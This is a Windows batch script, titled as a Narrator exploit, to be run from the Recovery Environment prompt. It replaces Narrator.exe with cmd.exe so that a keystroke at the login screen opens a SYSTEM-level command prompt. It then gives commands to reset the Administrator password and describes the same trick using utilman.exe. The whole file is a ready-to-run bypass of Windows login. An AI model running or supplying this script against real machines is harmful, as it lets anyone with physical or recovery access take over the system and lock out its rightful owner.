@echo off
REM ================================================================
REM Windows Narrator Exploit - Automated Batch Script
REM Target: Windows Recovery Environment Command Prompt
REM Usage: Run this in Recovery Mode CMD (Advanced Options)
REM ================================================================

color 0B
echo ================================================================
echo     Narrator.exe Replacement Script - Recovery Mode
echo ================================================================
echo.

REM ================================================================
REM PHASE 1: AUTO-DETECT SYSTEM DRIVE
REM ================================================================

echo [*] Phase 1: Detecting Windows system drive...
echo.

set SYSDRIVE=
set DRIVES=C D E F G

for %%d in (%DRIVES%) do (
    echo     [~] Testing drive %%d:\
    if exist %%d:\Windows\System32\cmd.exe (
        if exist %%d:\Windows\System32\kernel32.dll (
            if exist %%d:\Windows\System32\ntdll.dll (
                set SYSDRIVE=%%d
                echo     [+] Windows system found on %%d:\
                goto :DriveFound
            )
        )
    )
)

:DriveNotFound
echo.
echo [-] ERROR: Windows system drive not found!
echo     Tested drives: %DRIVES%
echo.
echo Manual verification needed:
echo     1. Run: diskpart
echo     2. Run: list volume
echo     3. Run: exit
echo     4. Identify Windows volume and modify this script
echo.
pause
exit /b 1

:DriveFound
echo.
echo [+] System Drive: %SYSDRIVE%:\
echo [+] Windows Path: %SYSDRIVE%:\Windows\System32
echo.
timeout /t 2 >nul

REM ================================================================
REM PHASE 2: DISPLAY VOLUME INFORMATION
REM ================================================================

echo [*] Phase 2: Volume information (via diskpart)...
echo.

echo list volume > %TEMP%\diskpart_script.txt
echo exit >> %TEMP%\diskpart_script.txt
diskpart /s %TEMP%\diskpart_script.txt
del %TEMP%\diskpart_script.txt >nul 2>&1

echo.
timeout /t 2 >nul

REM ================================================================
REM PHASE 3: VERIFY NARRATOR EXISTS
REM ================================================================

echo [*] Phase 3: Verifying Narrator.exe exists...

set NARRATOR=%SYSDRIVE%:\Windows\System32\Narrator.exe
set NARRATOR_BAK=%SYSDRIVE%:\Windows\System32\Narrator.bak
set CMD_PATH=%SYSDRIVE%:\Windows\System32\cmd.exe

if not exist "%NARRATOR%" (
    echo [-] ERROR: Narrator.exe not found at %NARRATOR%
    pause
    exit /b 1
)

if not exist "%CMD_PATH%" (
    echo [-] ERROR: cmd.exe not found at %CMD_PATH%
    pause
    exit /b 1
)

echo [+] Narrator.exe found
echo [+] cmd.exe found
echo.

REM Display file info
echo     Original Narrator.exe:
dir "%NARRATOR%" | find "Narrator.exe"
echo.

REM ================================================================
REM PHASE 4: BACKUP NARRATOR
REM ================================================================

echo [*] Phase 4: Creating backup of Narrator.exe...

if exist "%NARRATOR_BAK%" (
    echo [!] WARNING: Backup file already exists!
    echo     %NARRATOR_BAK%
    set /p OVERWRITE="    Overwrite existing backup? (Y/N): "
    
    if /i not "%OVERWRITE%"=="Y" (
        echo [-] Operation cancelled by user
        pause
        exit /b 1
    )
)

copy /Y "%NARRATOR%" "%NARRATOR_BAK%" >nul 2>&1

if %ERRORLEVEL% EQU 0 (
    echo [+] Backup created successfully
    echo     Location: %NARRATOR_BAK%
) else (
    echo [-] ERROR: Failed to create backup
    echo     Error code: %ERRORLEVEL%
    pause
    exit /b 1
)

echo.

REM ================================================================
REM PHASE 5: REPLACE NARRATOR WITH CMD
REM ================================================================

echo [*] Phase 5: Replacing Narrator.exe with cmd.exe...

copy /Y "%CMD_PATH%" "%NARRATOR%" >nul 2>&1

if %ERRORLEVEL% EQU 0 (
    echo [+] Replacement successful
) else (
    echo [-] ERROR: Failed to replace Narrator.exe
    echo     Error code: %ERRORLEVEL%
    echo [*] Attempting to restore backup...
    
    copy /Y "%NARRATOR_BAK%" "%NARRATOR%" >nul 2>&1
    
    if %ERRORLEVEL% EQU 0 (
        echo [+] Backup restored
    ) else (
        echo [-] CRITICAL: Failed to restore backup!
    )
    
    pause
    exit /b 1
)

echo.

REM ================================================================
REM PHASE 6: VERIFY REPLACEMENT
REM ================================================================

echo [*] Phase 6: Verifying replacement...
echo.

echo     Files in System32:
dir "%SYSDRIVE%:\Windows\System32\Narrator.*"
echo.

REM Compare file sizes
for %%F in ("%NARRATOR%") do set NARRATOR_SIZE=%%~zF
for %%F in ("%CMD_PATH%") do set CMD_SIZE=%%~zF

if "%NARRATOR_SIZE%"=="%CMD_SIZE%" (
    echo [+] Verification successful: Narrator.exe matches cmd.exe size
    echo     Size: %NARRATOR_SIZE% bytes
) else (
    echo [!] WARNING: Size mismatch detected!
    echo     Narrator: %NARRATOR_SIZE% bytes
    echo     cmd.exe: %CMD_SIZE% bytes
)

echo.
timeout /t 2 >nul

REM ================================================================
REM PHASE 7: INSTRUCTIONS & REBOOT
REM ================================================================

echo ================================================================
echo     EXPLOITATION SETUP COMPLETE!
echo ================================================================
echo.
echo [!] NEXT STEPS:
echo.
echo     1. System will reboot after you press a key
echo     2. At the login screen, press: Win + Ctrl + Enter
echo     3. A Command Prompt will open with SYSTEM privileges
echo     4. Change admin password:
echo.
echo        net user
echo        net user Administrator NewP@ssw0rd
echo.
echo [!] CLEANUP (optional after login):
echo.
echo        copy C:\Windows\System32\Narrator.bak C:\Windows\System32\Narrator.exe
echo        del C:\Windows\System32\Narrator.bak
echo.
echo [!] ALTERNATIVE: Use utilman.exe (Ease of Access button):
echo.
echo        From recovery CMD:
echo        copy %SYSDRIVE%:\Windows\System32\utilman.exe %SYSDRIVE%:\Windows\System32\utilman.bak
echo        copy %SYSDRIVE%:\Windows\System32\cmd.exe %SYSDRIVE%:\Windows\System32\utilman.exe
echo        Then click Ease of Access icon at login
echo.
echo ================================================================
echo.

set /p REBOOT="Do you want to reboot now? (Y/N): "

if /i "%REBOOT%"=="Y" (
    echo.
    echo [*] Rebooting in 5 seconds...
    timeout /t 5
    wpeutil reboot
) else (
    echo.
    echo [*] Reboot cancelled. You can reboot manually.
    echo     Command: wpeutil reboot
    echo.
    pause
)

exit /b 0
